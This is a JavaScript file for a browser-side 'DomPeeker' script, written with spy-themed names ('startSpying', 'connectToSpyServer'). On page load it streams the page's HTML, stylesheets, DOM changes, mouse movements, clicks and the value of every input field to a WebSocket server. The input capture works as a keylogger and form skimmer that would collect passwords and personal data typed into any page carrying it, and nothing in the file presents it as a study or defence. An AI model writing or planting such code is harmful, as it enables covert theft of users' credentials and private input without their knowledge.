// Dev by N7y 
class DomPeeker {
    constructor() {
        this.ws = null;
        this.observer = null;
        this.pageSnitch = {
            url: window.location.href,
            title: document.title,
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            }
        };
        this.stylesWeStole = new Set();
        
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => this.startSpying());
        } else {
            this.startSpying();
        }
    }

    startSpying() {
        // console.log('working');
        this.connectToSpyServer();
    }

    connectToSpyServer() {
        this.ws = new WebSocket('ws://localhost:8765');
        
        this.ws.onopen = () => {
            // console.log('connection-------');
            this.stealAllStyles().then(() => {
                this.setupDomStalker();
                this.watchUserMoves();
                this.sendFullGossip();
            });
        };

        this.ws.onerror = (oops) => {
            // console.log('error', oops);
        };
    }

    async stealAllStyles() {
        
        
       
        const styleTags = document.querySelectorAll('style');
        for (let styleTag of styleTags) {
            await this.stealStyleTag(styleTag);
        }
        
        
        const linkTags = document.querySelectorAll('link[rel="stylesheet"]');
        for (let linkTag of linkTags) {
            await this.stealExternalStyle(linkTag);
        }
       
        this.stealInlineStyles();
    }

    async stealStyleTag(styleTag) {
        const styleContent = styleTag.innerHTML;
        const styleId = this.generateStyleId(styleContent);
        
        if (!this.stylesWeStole.has(styleId)) {
            this.stylesWeStole.add(styleId);
            this.sendSpyMessage({
                type: 'style_theft',
                styleType: 'inline',
                content: styleContent,
                id: styleId
            });
        }
    }

    async stealExternalStyle(linkTag) {
        const href = linkTag.href;
        if (!href || this.stylesWeStole.has(href)) return;
        
        try {
            const response = await fetch(href);
            const cssContent = await response.text();
            
            this.stylesWeStole.add(href);
            this.sendSpyMessage({
                type: 'style_theft',
                styleType: 'external',
                content: cssContent,
                url: href,
                id: this.generateStyleId(cssContent)
            });
        } catch (error) {
            // console.log('-------------------', href);
            
            this.sendSpyMessage({
                type: 'style_theft',
                styleType: 'external_link',
                url: href
            });
        }
    }

    stealInlineStyles() {
        // console.log('dom snap');
    }

    generateStyleId(content) {
        //  hash for styleid
        return 'style_' + btoa(content).substring(0, 10).replace(/[^a-zA-Z0-9]/g, '');
    }

    sendFullGossip() {
        const domClone = document.documentElement.cloneNode(true);
        
        
        domClone.querySelectorAll('style, link[rel="stylesheet"]').forEach(tag => {
            tag.remove();
        });
        
        const domSnapshot = {
            type: 'full_dom_gossip',
            html: domClone.outerHTML,
            pageInfo: this.pageSnitch,
            scroll: this.getScrollPosition(),
            timestamp: Date.now(),
            totalStylesStolen: this.stylesWeStole.size
        };
        this.sendSpyMessage(domSnapshot);
    }

    sendSpyMessage(secretData) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify(secretData));
            console.log('📨 Sent:', secretData.type);
        }
    }

    setupDomStalker() {
        this.observer = new MutationObserver((mutations) => {
            mutations.forEach(mutation => {
                this.handleDomChange(mutation);
            });
        });

        this.observer.observe(document, {
            childList: true,
            attributes: true,
            characterData: true,
            subtree: true
        });
    }

    handleDomChange(mutation) {
        let changeReport = {
            type: 'dom_change',
            changeType: mutation.type,
            target: this.getElementAddress(mutation.target),
            timestamp: Date.now()
        };

        if (mutation.type === 'attributes') {
            changeReport.action = 'attribute_switch';
            changeReport.attribute = mutation.attributeName;
            changeReport.newValue = mutation.target.getAttribute(mutation.attributeName);
        } else if (mutation.type === 'childList') {
            if (mutation.addedNodes.length > 0) {
                changeReport.action = 'node_party';
                changeReport.newNodes = Array.from(mutation.addedNodes).map(node => 
                    node.outerHTML || node.textContent
                ).slice(0, 2);
            }
        }

        this.sendSpyMessage(changeReport);
    }

    getElementAddress(element) {
        if (!element || !element.tagName) return 'unknown';
        
        let address = element.tagName.toLowerCase();
        if (element.id) {
            address += `#${element.id}`;
        }
        if (element.className && typeof element.className === 'string') {
            address += `.${element.className.split(' ').join('.')}`;
        }
        
        return address;
    }

    getScrollPosition() {
        return {
            x: window.scrollX,
            y: window.scrollY
        };
    }

    watchUserMoves() {
        let lastMouseMove = 0;
        
        document.addEventListener('mousemove', (e) => {
            const now = Date.now();
            if (now - lastMouseMove > 50) {
                this.sendSpyMessage({
                    type: 'mouse_dance',
                    x: e.clientX,
                    y: e.clientY,
                    timestamp: now
                });
                lastMouseMove = now;
            }
        });








        document.addEventListener('click', (e) => {
            this.sendSpyMessage({
                type: 'element_tap',
                element: this.getElementAddress(e.target),
                x: e.clientX,
                y: e.clientY,
                timestamp: Date.now()
            });
        });

        document.addEventListener('input', (e) => {
            this.sendSpyMessage({
                type: 'keyboard_chatter',
                element: this.getElementAddress(e.target),
                value: e.target.value,
                timestamp: Date.now()
            });
        });



        let scrollTimeout;
        window.addEventListener('scroll', () => {
            clearTimeout(scrollTimeout);
            scrollTimeout = setTimeout(() => {
                this.sendSpyMessage({
                    type: 'page_scroll',
                    position: this.getScrollPosition(),
                    timestamp: Date.now()
                });
            }, 100);
        });

        window.addEventListener('resize', () => {
            this.pageSnitch.viewport = {
                width: window.innerWidth,
                height: window.innerHeight
            };
            this.sendSpyMessage({
                type: 'viewport_grow',
                viewport: this.pageSnitch.viewport,
                timestamp: Date.now()
            });
        });
    }
}

const domPeeker = new DomPeeker();
